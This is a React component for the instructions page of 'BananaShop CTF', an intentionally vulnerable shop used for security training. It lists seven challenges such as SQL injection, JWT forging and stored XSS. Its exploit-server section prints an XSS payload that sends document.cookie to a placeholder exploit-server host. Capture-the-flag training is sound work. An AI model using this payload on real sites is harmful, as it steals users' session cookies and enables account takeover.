export default function Instructions() {
  const challenges = [
    { name: 'Sensitive Data Exposure', difficulty: 'easy', hint: 'Not everything is hidden from the public eye...' },
    { name: 'IDOR', difficulty: 'easy', hint: 'Are you really limited to your own profile?' },
    { name: 'Reflected XSS', difficulty: 'medium', hint: 'What happens when you search for something unusual?' },
    { name: 'SQL Injection', difficulty: 'medium', hint: 'The login form may accept more than just usernames...' },
    { name: 'Business Logic Flaw', difficulty: 'medium', hint: 'Numbers can flow in both directions.' },
    { name: 'JWT Forging', difficulty: 'hard', hint: 'Secrets should be secret. Is this one?' },
    { name: 'Stored XSS', difficulty: 'hard', hint: 'Reviews are rendered as-is. What could you inject?' },
  ];

  const diffBadge = (d) => {
    if (d === 'easy') return 'badge-easy';
    if (d === 'medium') return 'badge-medium';
    return 'badge-hard';
  };

  return (
    <div className="page-container max-w-4xl">
      {/* Hero */}
      <div className="text-center mb-16">
        <h1 className="text-5xl font-heading font-extrabold mb-4">
          <span className="gradient-text">BananaShop CTF</span>
        </h1>
        <p className="text-white/50 text-lg max-w-2xl mx-auto leading-relaxed">
          This e-commerce platform has been <span className="text-accent">intentionally made vulnerable</span>.
          Your mission: find and exploit the security flaws to capture flags.
        </p>
      </div>

      {/* How it works */}
      <div className="card p-8 mb-8">
        <h2 className="font-heading font-bold text-xl mb-6 text-cyan">How It Works</h2>
        <div className="space-y-4 text-sm text-white/70 leading-relaxed">
          <div className="flex gap-4">
            <span className="shrink-0 w-8 h-8 rounded-full bg-cyan/20 text-cyan flex items-center justify-center font-heading font-bold">1</span>
            <p>Explore the BananaShop application. Create an account, browse products, send credits, write reviews.</p>
          </div>
          <div className="flex gap-4">
            <span className="shrink-0 w-8 h-8 rounded-full bg-cyan/20 text-cyan flex items-center justify-center font-heading font-bold">2</span>
            <p>Find vulnerabilities and exploit them to reveal hidden flags in the format <code className="font-mono text-accent bg-accent/10 px-2 py-0.5 rounded">CTF&#123;...&#125;</code></p>
          </div>
          <div className="flex gap-4">
            <span className="shrink-0 w-8 h-8 rounded-full bg-cyan/20 text-cyan flex items-center justify-center font-heading font-bold">3</span>
            <p>Submit your flags on the <strong>Dashboard</strong> page. Each valid flag earns your team a point on the scoreboard.</p>
          </div>
          <div className="flex gap-4">
            <span className="shrink-0 w-8 h-8 rounded-full bg-cyan/20 text-cyan flex items-center justify-center font-heading font-bold">4</span>
            <p>Use your <strong>Exploit Server</strong> to receive exfiltrated data (cookies, tokens). It logs every HTTP request it receives.</p>
          </div>
        </div>
      </div>

      {/* Challenges */}
      <div className="card p-8 mb-8">
        <h2 className="font-heading font-bold text-xl mb-6 text-accent">Challenges</h2>
        <p className="text-white/40 text-sm mb-6">7 vulnerabilities to find. Each reveals a unique flag.</p>

        <div className="space-y-3">
          {challenges.map((c, i) => (
            <div key={i} className="flex items-center justify-between p-4 rounded-lg bg-white/[0.02] border border-white/[0.05]">
              <div className="flex items-center gap-4">
                <span className="font-mono text-white/20 text-sm w-6">#{i + 1}</span>
                <span className="font-heading font-semibold">{c.name}</span>
              </div>
              <div className="flex items-center gap-4">
                <span className="text-white/30 text-xs italic hidden md:block">{c.hint}</span>
                <span className={diffBadge(c.difficulty)}>{c.difficulty}</span>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Exploit Server */}
      <div className="card p-8 mb-8 border-terracotta/20">
        <h2 className="font-heading font-bold text-xl mb-6 text-terracotta">Exploit Server</h2>
        <div className="text-sm text-white/70 space-y-3 leading-relaxed">
          <p>Your team has a dedicated exploit server that acts as a webhook receiver. Use it to exfiltrate data during XSS attacks.</p>
          <div className="p-4 bg-white/[0.03] rounded-lg font-mono text-xs space-y-2">
            <p className="text-white/40"># Example: exfiltrate cookies via XSS</p>
            <p className="text-accent">&lt;img src=x onerror="fetch('http://YOUR_EXPLOIT_SERVER/hook?c='+document.cookie)"&gt;</p>
          </div>
          <p>Access your exploit server dashboard to see incoming requests in real-time.</p>
        </div>
      </div>

      {/* Recommended Tools */}
      <div className="card p-8">
        <h2 className="font-heading font-bold text-xl mb-6">Recommended Tools</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {[
            { name: 'Browser DevTools', desc: 'Inspect network requests, cookies, console (F12)' },
            { name: 'curl / Postman', desc: 'Send custom HTTP requests to the API' },
            { name: 'jwt.io', desc: 'Decode and forge JSON Web Tokens' },
            { name: 'Burp Suite', desc: 'Intercept and modify HTTP traffic (optional)' },
          ].map((tool, i) => (
            <div key={i} className="p-4 rounded-lg bg-white/[0.02] border border-white/[0.05]">
              <h3 className="font-heading font-semibold text-sm text-cyan mb-1">{tool.name}</h3>
              <p className="text-white/40 text-xs">{tool.desc}</p>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
